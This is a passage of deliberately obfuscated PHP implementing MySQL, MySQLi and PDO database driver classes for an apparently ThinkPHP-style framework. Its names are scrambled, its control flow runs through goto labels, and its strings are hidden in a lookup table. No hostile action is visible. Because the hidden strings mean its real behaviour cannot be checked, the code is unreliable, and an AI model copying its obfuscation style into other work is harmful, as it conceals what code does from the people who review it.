(!is_null($eœ¬ç‘ªñÕ) && is_string($a»Ë∞çää“)) { if (!is_array($eœ¬ç‘ªñÕ)) { $eœ¬ç‘ªñÕ = func_get_args(); array_shift($eœ¬ç‘ªñÕ); } $eœ¬ç‘ªñÕ = array_map(array($this->db, $EØèßíµü¡[331]), $eœ¬ç‘ªñÕ); $a»Ë∞çää“ = vsprintf($a»Ë∞çää“, $eœ¬ç‘ªñÕ); } elseif (is_object($a»Ë∞çää“)) { $a»Ë∞çää“ = get_object_vars($a»Ë∞çää“); } elseif (is_array($a»Ë∞çää“)) { foreach ($a»Ë∞çää“ as $Déä¢ÀÃπ§ => $A°ﬁ¶·±æñ) { if ((is_numeric($Déä¢ÀÃπ§) || !$Déä¢ÀÃπ§) && is_string($A°ﬁ¶·±æñ)) { think_trace($EØèßíµü¡[338], $EØèßíµü¡[33], $EØèßíµü¡[46]); die; } } } if (is_string($a»Ë∞çää“) && $EØèßíµü¡[33] != $a»Ë∞çää“) { $dÈá‰ÎåÑÒ = array(); $dÈá‰ÎåÑÒ[$EØèßíµü¡[339]] = $a»Ë∞çää“; $a»Ë∞çää“ = $dÈá‰ÎåÑÒ; } if (isset($this->options[$EØèßíµü¡[263]])) { $this->options[$EØèßíµü¡[263]] = array_merge($this->options[$EØèßíµü¡[263]], $a»Ë∞çää“); } else { $this->options[$EØèßíµü¡[263]] = $a»Ë∞çää“; } return $this; } public function limit($BÌñéﬂ≤°‰, $dçŒÒ≠é≤ = null) { $CñæÍ‡¿ÍÁ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->options[$CñæÍ‡¿ÍÁ[280]] = is_null($dçŒÒ≠é≤) ? $BÌñéﬂ≤°‰ : $BÌñéﬂ≤°‰ . $CñæÍ‡¿ÍÁ[47] . $dçŒÒ≠é≤; return $this; } public function page($dçËÒ±Ü⁄ô, $A∂ ¢ùíÊí = null) { $Fê¬éÃè·ê =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->options[$Fê¬éÃè·ê[340]] = is_null($A∂ ¢ùíÊí) ? $dçËÒ±Ü⁄ô : $dçËÒ±Ü⁄ô . $Fê¬éÃè·ê[47] . $A∂ ¢ùíÊí; return $this; } public function comment($Cëÿ¯èÒÓÑ) { $this->options[$_SERVER[Ä¿¡‡öóµŸﬂ‡][341]] = $Cëÿ¯èÒÓÑ; return $this; } public function setProperty($aÙ·¨œø≈Æ, $AµÖºæÏºå) { if (property_exists($this, $aÙ·¨œø≈Æ)) { $this->{$aÙ·¨œø≈Æ} = $AµÖºæÏºå; } return $this; } } goto F±›∞ö‚¡¡; Dﬂ∂ÈÇ«Ï«: class DbMysql extends Db { public function __construct($aÈÑ•˘µçì = '') { $C´„‹⁄†ÆÖ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!extension_loaded($C´„‹⁄†ÆÖ[736])) { think_exception(think_lang($C´„‹⁄†ÆÖ[10]) . $C´„‹⁄†ÆÖ[802]); } if (!empty($aÈÑ•˘µçì)) { $this->config = $aÈÑ•˘µçì; if (empty($this->config[$C´„‹⁄†ÆÖ[13]])) { $this->config[$C´„‹⁄†ÆÖ[13]] = $C´„‹⁄†ÆÖ[33]; } } } public function connect($EÆù¢Ã£≈œ = '', $dı†±⁄ÑŸ˜ = 0, $fÓΩ¢ãœ≈˘ = false) { $eàË’–¯≥ã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->linkID[$dı†±⁄ÑŸ˜])) { goto aßÍÖ∏ü±…; aßÍÖ∏ü±…: if (empty($EÆù¢Ã£≈œ)) { $EÆù¢Ã£≈œ = $this->config; } $dë◊Ó≠°◊ô = $EÆù¢Ã£≈œ[$eàË’–¯≥ã[803]] . ($EÆù¢Ã£≈œ[$eàË’–¯≥ã[804]] ? "\x3a{$EÆù¢Ã£≈œ[$eàË’–¯≥ã[804]]}" : $eàË’–¯≥ã[33]); $FÛ•ìÖåü’ = !empty($EÆù¢Ã£≈œ[$eàË’–¯≥ã[13]][$eàË’–¯≥ã[14]]) ? $EÆù¢Ã£≈œ[$eàË’–¯≥ã[13]][$eàË’–¯≥ã[14]] : $this->pconnect; goto fâ∂ƒßæûõ; b¯€¶éª¡⁄: if (1 != think_config($eàË’–¯≥ã[18])) { unset($this->config); } goto cıëç‹œ∫∫; añΩá£¥’Ÿ: mysql_query($eàË’–¯≥ã[807] . think_config($eàË’–¯≥ã[808]) . $eàË’–¯≥ã[55], $this->linkID[$dı†±⁄ÑŸ˜]); if ($b£ÔÛÏÿ’Ú > $eàË’–¯≥ã[809]) { mysql_query($eàË’–¯≥ã[810], $this->linkID[$dı†±⁄ÑŸ˜]); } $this->connected = !0; goto b¯€¶éª¡⁄; fâ∂ƒßæûõ: if ($FÛ•ìÖåü’) { $this->linkID[$dı†±⁄ÑŸ˜] = mysql_pconnect($dë◊Ó≠°◊ô, $EÆù¢Ã£≈œ[$eàË’–¯≥ã[805]], $EÆù¢Ã£≈œ[$eàË’–¯≥ã[806]], 131072); } else { $this->linkID[$dı†±⁄ÑŸ˜] = mysql_connect($dë◊Ó≠°◊ô, $EÆù¢Ã£≈œ[$eàË’–¯≥ã[805]], $EÆù¢Ã£≈œ[$eàË’–¯≥ã[806]], !0, 131072); } if (!$this->linkID[$dı†±⁄ÑŸ˜] || !empty($EÆù¢Ã£≈œ[$eàË’–¯≥ã[17]]) && !mysql_select_db($EÆù¢Ã£≈œ[$eàË’–¯≥ã[17]], $this->linkID[$dı†±⁄ÑŸ˜])) { think_exception(mysql_error()); } $b£ÔÛÏÿ’Ú = mysql_get_server_info($this->linkID[$dı†±⁄ÑŸ˜]); goto añΩá£¥’Ÿ; cıëç‹œ∫∫: } return $this->linkID[$dı†±⁄ÑŸ˜]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($aôÍ‹Ü—Æ∑) { goto eäÇ—°⁄ùÎ; b¬ƒÏ‡ƒûä: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } goto f’Ô»ôè´∆; eäÇ—°⁄ùÎ: $FøåîìπÕÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (0 === stripos($aôÍ‹Ü—Æ∑, $FøåîìπÕÿ[252])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); goto EôıÂÍ˘‡ö; D‘äﬁ“≈ä˘: think_action_status($FøåîìπÕÿ[19], 1); think_status($FøåîìπÕÿ[20]); $this->queryID = mysql_query($aôÍ‹Ü—Æ∑, $this->_linkID); goto b¬ƒÏ‡ƒûä; EôıÂÍ˘‡ö: if (!$this->_linkID) { return !1; } $this->queryStr = $aôÍ‹Ü—Æ∑; if ($this->queryID) { $this->free(); } goto D‘äﬁ“≈ä˘; f’Ô»ôè´∆: } public function execute($Dëà˜˜‹†…) { goto dÇÉâäääÆ; C∫ÛÁ‰˜≤â: think_status($a≤Ü˜∞¬¡ß[20]); $dÀçß·Ω¥‡ = mysql_query($Dëà˜˜‹†…, $this->_linkID); $this->debug(); goto dÁΩåŸ®ÏÖ; dÇÉâäääÆ: $a≤Ü˜∞¬¡ß =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B«Áˆî„¥…; B«Áˆî„¥…: $this->queryStr = $Dëà˜˜‹†…; if ($this->queryID) { $this->free(); } think_action_status($a≤Ü˜∞¬¡ß[21], 1); goto C∫ÛÁ‰˜≤â; dÁΩåŸ®ÏÖ: if (!1 === $dÀçß·Ω¥‡) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } goto dôÎÓΩÜä; dôÎÓΩÜä: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[Ä¿¡‡öóµŸﬂ‡][811], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $c…ç„ºÔˆö = mysql_query($_SERVER[Ä¿¡‡öóµŸﬂ‡][812], $this->_linkID); $this->transTimes = 0; if (!$c…ç„ºÔˆö) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $F°˘åû≤‡Î = mysql_query($_SERVER[Ä¿¡‡öóµŸﬂ‡][813], $this->_linkID); $this->transTimes = 0; if (!$F°˘åû≤‡Î) { $this->error(); return !1; } } return !0; } private function getAll() { $DÖñ¯ÌªŸà = array(); if ($this->numRows > 0) { while ($DÑÆÇ€ÕáÜ = mysql_fetch_assoc($this->queryID)) { $DÖñ¯ÌªŸà[] = $DÑÆÇ€ÕáÜ; } mysql_data_seek($this->queryID, 0); } return $DÖñ¯ÌªŸà; } public function getFields($c∏üœå°Á∆) { $cé©¥Œ≠›ä =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dî¯Œ‰òã‹ = $this->query($cé©¥Œ≠›ä[814] . $this->parseKey($c∏üœå°Á∆)); $A∑ÌêüÖ◊ü = array(); if ($dî¯Œ‰òã‹) { foreach ($dî¯Œ‰òã‹ as $eù∂’É åÔ => $C¨Ç¯£áÆﬂ) { $A∑ÌêüÖ◊ü[$C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[27]]] = array($cé©¥Œ≠›ä[28] => $C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[27]], $cé©¥Œ≠›ä[29] => $C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[30]], $cé©¥Œ≠›ä[31] => (bool) (strtoupper($C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[32]]) === $cé©¥Œ≠›ä[815]), $cé©¥Œ≠›ä[34] => $C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[35]], $cé©¥Œ≠›ä[36] => strtolower($C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[37]]) == $cé©¥Œ≠›ä[38], $cé©¥Œ≠›ä[39] => strtolower($C¨Ç¯£áÆﬂ[$cé©¥Œ≠›ä[40]]) == $cé©¥Œ≠›ä[41]); } } return $A∑ÌêüÖ◊ü; } public function getTables($E≈ÑéøÉÍ¥ = '') { $FØ∞ïÎÀõÜ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!empty($E≈ÑéøÉÍ¥)) { $cñ»≠÷π¿“ = $FØ∞ïÎÀõÜ[816] . $E≈ÑéøÉÍ¥; } else { $cñ»≠÷π¿“ = $FØ∞ïÎÀõÜ[817]; } $EΩîñ¨†ΩØ = $this->query($cñ»≠÷π¿“); $e…£÷é≥Û· = array(); foreach ($EΩîñ¨†ΩØ as $díåÉŒä≠∑ => $aÎâ´µ‡≥±) { $e…£÷é≥Û·[$díåÉŒä≠∑] = current($aÎâ´µ‡≥±); } return $e…£÷é≥Û·; } public function replace($AááçÛ“ÒÛ, $D˜ˆÜÑÕâ∞ = array()) { $fù¯Õè≤àË =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($AááçÛ“ÒÛ as $cã›∑ß•·ï => $dŸè°©í›Á) { $eóÔÏ≤∆Ñ = $this->parseValue($dŸè°©í›Á); if (is_scalar($eóÔÏ≤∆Ñ)) { $cãä«í’óˆ[] = $eóÔÏ≤∆Ñ; $b≈Õ˜îæ«Ë[] = $this->parseKey($cã›∑ß•·ï); } } $bÜàøÜØÈÊ = $fù¯Õè≤àË[818] . $this->parseTable($D˜ˆÜÑÕâ∞[$fù¯Õè≤àË[267]]) . $fù¯Õè≤àË[819] . implode($fù¯Õè≤àË[47], $b≈Õ˜îæ«Ë) . $fù¯Õè≤àË[820] . implode($fù¯Õè≤àË[47], $cãä«í’óˆ) . $fù¯Õè≤àË[821]; return $this->execute($bÜàøÜØÈÊ); } public function insertAll($fß≠¯˘»‡ã, $F»àÍ…¨õ± = array(), $BπØùõùèœ = false) { goto aÍ¨Û‡ÑÉñ; AóËê‘ Ç„: $fâ®Êä∂¡Õ = ($BπØùõùèœ ? $B®†•¡òçª[823] : $B®†•¡òçª[824]) . $B®†•¡òçª[825] . $this->parseTable($F»àÍ…¨õ±[$B®†•¡òçª[267]]) . $B®†•¡òçª[819] . implode($B®†•¡òçª[47], $aæªÃ÷œôÜ) . $B®†•¡òçª[826] . implode($B®†•¡òçª[47], $fõÂ—πã“û); return $this->execute($fâ®Êä∂¡Õ); goto f∑ã‚∞•≥Ÿ; aÍ¨Û‡ÑÉñ: $B®†•¡òçª =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!is_array($fß≠¯˘»‡ã[0])) { return !1; } $aæªÃ÷œôÜ = array_keys($fß≠¯˘»‡ã[0]); goto A´¬»¿Îìü; A´¬»¿Îìü: $fõÂ—πã“û = array(); foreach ($fß≠¯˘»‡ã as $eÜ∏≠ÈÆ⁄) { $b≈˘Úª¡”– = array(); foreach ($eÜ∏≠ÈÆ⁄ as $B«´«◊ç∫É => $F™öé™ÁÚù) { $F™öé™ÁÚù = $this->parseValue($F™öé™ÁÚù); if (is_scalar($F™öé™ÁÚù)) { $b≈˘Úª¡”–[] = $F™öé™ÁÚù; } } $fõÂ—πã“û[] = $B®†•¡òçª[248] . implode($B®†•¡òçª[47], $b≈˘Úª¡”–) . $B®†•¡òçª[821]; } array_walk($aæªÃ÷œôÜ, array($this, $B®†•¡òçª[822])); goto AóËê‘ Ç„; f∑ã‚∞•≥Ÿ: } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $BﬂÏ†ªÕâ° =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->error = mysql_errno() . $BﬂÏ†ªÕâ°[4] . mysql_error($this->_linkID); if ($BﬂÏ†ªÕâ°[33] != $this->queryStr) { $this->error .= LNG($BﬂÏ†ªÕâ°[45]) . $this->queryStr; } think_trace($this->error, $BﬂÏ†ªÕâ°[33], $BﬂÏ†ªÕâ°[46]); return $this->error; } public function escapeString($E∆ï Ò‡ê·) { if ($this->_linkID) { return mysql_real_escape_string($E∆ï Ò‡ê·, $this->_linkID); } else { return mysql_escape_string($E∆ï Ò‡ê·); } } public function parseKey(&$fÙê–Í±÷, $A÷Ì›¿®ô› = true) { $fÙÓÉ∏π‚∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($A÷Ì›¿®ô›) { $fÙê–Í±÷ = $this->parseKeyCheck($fÙê–Í±÷); } if ($fÙê–Í±÷ != $fÙÓÉ∏π‚∆[176] && !preg_match($fÙÓÉ∏π‚∆[827], $fÙê–Í±÷)) { $fÙê–Í±÷ = $fÙÓÉ∏π‚∆[828] . trim($fÙê–Í±÷, $fÙÓÉ∏π‚∆[828]) . $fÙÓÉ∏π‚∆[828]; } return $fÙê–Í±÷; } } class DbMysqli extends Db { public function __construct($d†›ﬁ±éçê = '') { $Cöè¨¢ƒΩ¶ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!extension_loaded($Cöè¨¢ƒΩ¶[735])) { think_exception(think_lang($Cöè¨¢ƒΩ¶[10]) . $Cöè¨¢ƒΩ¶[829]); } if (!empty($d†›ﬁ±éçê)) { $this->config = $d†›ﬁ±éçê; if (empty($this->config[$Cöè¨¢ƒΩ¶[13]])) { $this->config[$Cöè¨¢ƒΩ¶[13]] = $Cöè¨¢ƒΩ¶[33]; } } } public function connect($eô‹ÈÉÛ€Æ = '', $D¬äˆò®ö≤ = 0) { $a∏ñ∂Û¢¬¥ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->linkID[$D¬äˆò®ö≤])) { goto EÀ‹øΩöµ”; D‰ˆÉÜÜ≈Ñ: $this->connected = !0; if (1 != think_config($a∏ñ∂Û¢¬¥[18])) { unset($this->config); } goto aÃÒ˜ºÓ≤˘; EÀ‹øΩöµ”: if (empty($eô‹ÈÉÛ€Æ)) { $eô‹ÈÉÛ€Æ = $this->config; } $this->linkID[$D¬äˆò®ö≤] = new mysqli($eô‹ÈÉÛ€Æ[$a∏ñ∂Û¢¬¥[803]], $eô‹ÈÉÛ€Æ[$a∏ñ∂Û¢¬¥[805]], $eô‹ÈÉÛ€Æ[$a∏ñ∂Û¢¬¥[806]], $eô‹ÈÉÛ€Æ[$a∏ñ∂Û¢¬¥[17]], $eô‹ÈÉÛ€Æ[$a∏ñ∂Û¢¬¥[804]] ? intval($eô‹ÈÉÛ€Æ[$a∏ñ∂Û¢¬¥[804]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } goto BéÀ∂Í‘„Ÿ; BéÀ∂Í‘„Ÿ: $AßÑœ¶áû± = $this->linkID[$D¬äˆò®ö≤]->server_version; $this->linkID[$D¬äˆò®ö≤]->query($a∏ñ∂Û¢¬¥[807] . think_config($a∏ñ∂Û¢¬¥[808]) . $a∏ñ∂Û¢¬¥[55]); if ($AßÑœ¶áû± > $a∏ñ∂Û¢¬¥[809]) { $this->linkID[$D¬äˆò®ö≤]->query($a∏ñ∂Û¢¬¥[810]); } goto D‰ˆÉÜÜ≈Ñ; aÃÒ˜ºÓ≤˘: } return $this->linkID[$D¬äˆò®ö≤]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($cõù≠ãœâ∂) { goto eè —û±Ùç; C∫†Æµ ≥ì: $this->queryStr = $cõù≠ãœâ∂; if ($this->queryID) { $this->free(); } think_action_status($F¯Ï≈Í≈⁄Ÿ[19], 1); goto EÜ÷”∞Ûé∫; D©éß…¢À´: $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } goto DˆœÃÎ‰øˆ; EÜ÷”∞Ûé∫: think_status($F¯Ï≈Í≈⁄Ÿ[20]); $this->queryID = $this->_linkID->query($cõù≠ãœâ∂); if ($this->_linkID->more_results()) { while (($F«™…ª¨Ïõ = $this->_linkID->next_result()) != NULL) { $F«™…ª¨Ïõ->free_result(); } } goto D©éß…¢À´; eè —û±Ùç: $F¯Ï≈Í≈⁄Ÿ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto C∫†Æµ ≥ì; DˆœÃÎ‰øˆ: } public function execute($B‰ë∫‘©»é) { goto cíÉÓÕ±å°; dó«Èµá≠ê: think_status($EıÛ›ê“º“[20]); $cùÉöéÉôÑ = $this->_linkID->query($B‰ë∫‘©»é); $this->debug(); goto e§ëÆâÒê‘; cíÉÓÕ±å°: $EıÛ›ê“º“ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto F‡Û¬πî›±; e§ëÆâÒê‘: if (!1 === $cùÉöéÉôÑ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } goto DŸ ï”Ò∏´; F‡Û¬πî›±: $this->queryStr = $B‰ë∫‘©»é; if ($this->queryID) { $this->free(); } think_action_status($EıÛ›ê“º“[21], 1); goto dó«Èµá≠ê; DŸ ï”Ò∏´: } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $BÂæ··ùç– = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$BÂæ··ùç–) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $B¥≠¯Ë≈¨§ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$B¥≠¯Ë≈¨§) { $this->error(); return !1; } } return !0; } private function getAll() { $b∞ÖèóπíÉ = array(); if ($this->numRows > 0) { for ($fç»ãƒÂ°® = 0; $fç»ãƒÂ°® < $this->numRows; $fç»ãƒÂ°®++) { $b∞ÖèóπíÉ[$fç»ãƒÂ°®] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $b∞ÖèóπíÉ; } public function getFields($a§œ‰ÏÖ°) { $f¢„◊‡≠Öã =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $dÛº◊∑ÙæÕ = $this->query($f¢„◊‡≠Öã[814] . $this->parseKey($a§œ‰ÏÖ°)); $D‰ÚÒ ®Ãí = array(); if ($dÛº◊∑ÙæÕ) { foreach ($dÛº◊∑ÙæÕ as $a¬¢õç∑¡Õ => $EÚæÿ‚›è†) { $D‰ÚÒ ®Ãí[$EÚæÿ‚›è†[$f¢„◊‡≠Öã[27]]] = array($f¢„◊‡≠Öã[28] => $EÚæÿ‚›è†[$f¢„◊‡≠Öã[27]], $f¢„◊‡≠Öã[29] => $EÚæÿ‚›è†[$f¢„◊‡≠Öã[30]], $f¢„◊‡≠Öã[31] => (bool) ($EÚæÿ‚›è†[$f¢„◊‡≠Öã[32]] === $f¢„◊‡≠Öã[33]), $f¢„◊‡≠Öã[34] => $EÚæÿ‚›è†[$f¢„◊‡≠Öã[35]], $f¢„◊‡≠Öã[36] => strtolower($EÚæÿ‚›è†[$f¢„◊‡≠Öã[37]]) == $f¢„◊‡≠Öã[38], $f¢„◊‡≠Öã[39] => strtolower($EÚæÿ‚›è†[$f¢„◊‡≠Öã[40]]) == $f¢„◊‡≠Öã[41]); } } return $D‰ÚÒ ®Ãí; } public function getTables($FñÍù∆âÈ∆ = '') { $b÷Ë‰¯È‚Ó =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $bõÃπ«»Ë¥ = !empty($FñÍù∆âÈ∆) ? $b÷Ë‰¯È‚Ó[816] . $FñÍù∆âÈ∆ : $b÷Ë‰¯È‚Ó[817]; $c‹õÜÑ∑Óº = $this->query($bõÃπ«»Ë¥); $eıÎ⁄˜á±÷ = array(); if ($c‹õÜÑ∑Óº) { foreach ($c‹õÜÑ∑Óº as $dçê¢É˜›° => $a™«ÑÕÌñŸ) { $eıÎ⁄˜á±÷[$dçê¢É˜›°] = current($a™«ÑÕÌñŸ); } } return $eıÎ⁄˜á±÷; } public function replace($aª¬â∑Ö¬…, $Eöå¥–¿ëç = array()) { $BúÊ◊⁄·Ö∏ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; foreach ($aª¬â∑Ö¬… as $dÑΩã‘∏åë => $c∂∂‘ÉéÒù) { $Cù´Ö àÃ∞ = $this->parseValue($c∂∂‘ÉéÒù); if (is_scalar($Cù´Ö àÃ∞)) { $F¶ç∆Ñ∆Òﬁ[] = $Cù´Ö àÃ∞; $DÊç⁄ŒïœÇ[] = $this->parseKey($dÑΩã‘∏åë); } } $CÖëÍ∆î∞Í = $BúÊ◊⁄·Ö∏[818] . $this->parseTable($Eöå¥–¿ëç[$BúÊ◊⁄·Ö∏[267]]) . $BúÊ◊⁄·Ö∏[819] . implode($BúÊ◊⁄·Ö∏[47], $DÊç⁄ŒïœÇ) . $BúÊ◊⁄·Ö∏[820] . implode($BúÊ◊⁄·Ö∏[47], $F¶ç∆Ñ∆Òﬁ) . $BúÊ◊⁄·Ö∏[821]; return $this->execute($CÖëÍ∆î∞Í); } public function insertAll($b≤¨≥ç€Ω‹, $fŸÒÑÇÛ°ª = array(), $b¥∫èéÉ»Û = false) { goto DÜéöÁçÇÖ; DÜéöÁçÇÖ: $cπü¥Ñ™ë∫ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!is_array($b≤¨≥ç€Ω‹[0])) { return !1; } $c‡ıµÌÍñ€ = array_keys($b≤¨≥ç€Ω‹[0]); goto d®é«îÔ©Ω; a™˘ê©•ØÈ: $bóæ≠¬Öß¶ = ($b¥∫èéÉ»Û ? $cπü¥Ñ™ë∫[823] : $cπü¥Ñ™ë∫[824]) . $cπü¥Ñ™ë∫[825] . $this->parseTable($fŸÒÑÇÛ°ª[$cπü¥Ñ™ë∫[267]]) . $cπü¥Ñ™ë∫[819] . implode($cπü¥Ñ™ë∫[47], $c‡ıµÌÍñ€) . $cπü¥Ñ™ë∫[826] . implode($cπü¥Ñ™ë∫[47], $Dê∆≈Ù≤Ñç); return $this->execute($bóæ≠¬Öß¶); goto BüÉêõãéè; d®é«îÔ©Ω: $Dê∆≈Ù≤Ñç = array(); foreach ($b≤¨≥ç€Ω‹ as $bÔï´Ö◊´) { $E¶”Ï…¿Ωà = array(); foreach ($bÔï´Ö◊´ as $FËÃ¯üäß¡ => $fò…·à¡§Ø) { $fò…·à¡§Ø = $this->parseValue($fò…·à¡§Ø); if (is_scalar($fò…·à¡§Ø)) { $E¶”Ï…¿Ωà[] = $fò…·à¡§Ø; } } $Dê∆≈Ù≤Ñç[] = $cπü¥Ñ™ë∫[248] . implode($cπü¥Ñ™ë∫[47], $E¶”Ï…¿Ωà) . $cπü¥Ñ™ë∫[821]; } array_walk($c‡ıµÌÍñ€, array($this, $cπü¥Ñ™ë∫[822])); goto a™˘ê©•ØÈ; BüÉêõãéè: } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $fëÌóáÃÉì =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; $this->error = $this->_linkID->errno . $fëÌóáÃÉì[4] . $this->_linkID->error; if ($fëÌóáÃÉì[33] != $this->queryStr) { $this->error .= LNG($fëÌóáÃÉì[45]) . $this->queryStr; } think_trace($this->error, $fëÌóáÃÉì[33], $fëÌóáÃÉì[46]); return $this->error; } public function escapeString($F’±„∫ã∞Ó) { if ($this->_linkID) { return $this->_linkID->real_escape_string($F’±„∫ã∞Ó); } else { return addslashes($F’±„∫ã∞Ó); } } public function parseKey(&$dÒ∏ñ‰€·Ü, $cö‡ú¯ˆô⁄ = true) { $DÒå“ÁΩ≥∆ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if ($cö‡ú¯ˆô⁄) { $dÒ∏ñ‰€·Ü = $this->parseKeyCheck($dÒ∏ñ‰€·Ü); } if ($dÒ∏ñ‰€·Ü != $DÒå“ÁΩ≥∆[176] && !preg_match($DÒå“ÁΩ≥∆[827], $dÒ∏ñ‰€·Ü)) { $dÒ∏ñ‰€·Ü = $DÒå“ÁΩ≥∆[828] . trim($dÒ∏ñ‰€·Ü, $DÒå“ÁΩ≥∆[828]) . $DÒå“ÁΩ≥∆[828]; } return $dÒ∏ñ‰€·Ü; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($b≈ŒÃÏàë⁄ = '') { $fÿé√àä Î =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!class_exists($fÿé√àä Î[830])) { think_exception(think_lang($fÿé√àä Î[10]) . $fÿé√àä Î[831]); } if (!empty($b≈ŒÃÏàë⁄)) { $this->config = $b≈ŒÃÏàë⁄; if (empty($this->config[$fÿé√àä Î[13]])) { $this->config[$fÿé√àä Î[13]] = array(); } } } public function connect($fΩÑé∑ìπ® = '', $CŸ”™Ω‡·‘ = 0) { $Dì˜õèÌÙ¯ =& $_SERVER[Ä¿¡‡öóµŸﬂ‡]; if (!isset($this->linkID[$CŸ”™Ω‡·‘])) { goto F¿»§Ú†◊˜; F¿»§Ú†◊˜: if (empty($fΩÑé∑ìπ®)) { $fΩÑé∑ìπ® = $this->config; } if ($this->pconnect) { $fΩÑé∑ìπ®[$Dì˜õèÌÙ¯[13]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$CŸ”™Ω‡·‘] = new PDO($fΩÑé∑ìπ®[$Dì˜õèÌÙ¯[832]], $fΩÑé∑ìπ®[$Dì˜õèÌÙ¯[805]], $fΩÑé∑ìπ®[$Dì˜õèÌÙ¯[806]], $fΩÑé∑ìπ®[$Dì˜õèÌÙ¯[13]]); } catch (PDOException $fëúı–¬Ïµ) { think_exception($fëúı–¬Ïµ->getMessage()); } goto B•¥œ‰µ™Ó; B•¥œ‰µ™Ó: $this->dbType = $this->_getDsnType($fΩÑé∑ìπ®[$Dì˜õèÌÙ¯[832]]); if (in_array($this->dbType, array($Dì˜õèÌÙ¯[833], $Dì˜õèÌÙ¯[834], $Dì˜õèÌÙ¯[835], $Dì˜õèÌÙ¯[836]))) { think_exception($Dì˜õèÌÙ¯[837] . $this->dbType . $Dì˜õèÌÙ¯[838] . $this->dbType . $Dì˜õèÌÙ¯[839]); } if (!$this->linkID[$CŸ”™Ω‡·‘]) { think_exception($Dì˜õèÌÙ¯[840]); } goto E≈ßêÂ¢£ﬂ; E≈ßêÂ¢£ﬂ: $this->linkID[$CŸ”™Ω‡·‘]->exec($Dì˜õèÌÙ¯[841] . think_config($Dì˜õèÌÙ¯[808])); $this->connected = !0; if (1 != think_config($Dì˜õèÌÙ¯[18])) { unset($this->config); } goto Eê©ÀﬂÈπ¡; Eê©ÀﬂÈπ¡: } return $this->linkID[$CŸ”™Ω‡·‘]; } public function free() { $this->PDOStatement = null; } public function query($cáñ’˜—Àò, $e›”–…·⁄æ = array()) { goto A°àÓﬁä®˜; BéÆ≥√·ËÊ: think_action_status($a¯Ë ë⁄ƒÑ[19], 1); think_status($a¯Ë ë⁄ƒÑ[20]); $this->PDOStatement = $this->_linkID->prepare($cáñ’˜—Àò); goto F˜£»öï˘è; Bêº‚íÖ»Ù: if (!1 === $bÛ∫â„úââ) { $this->error(); return !1; } else { return $this->getAll(); } goto Bê‡Õú®øÕ; d©Ø††¡„ : $this->queryStr = $cáñ’˜—Àò; if (!empty($e›”–…·⁄æ)) { $this->queryStr .= $a¯Ë ë⁄ƒÑ[842] . print_r($e›”–…·⁄æ, !0) . $a¯Ë ë⁄ƒÑ[843]; } if (!empty($this->PDOStatement)) { $this->free(); } goto BéÆ≥√·ËÊ; F˜£»öï˘è: if (!1 === $this->PDOStatement) { think_exception($this->error()); } $bÛ∫â„úââ = $this->PDOStatement->execute($e›”–…·⁄æ); $this->debug(); goto Bêº‚íÖ»Ù; A°àÓﬁä®˜: $a¯Ë 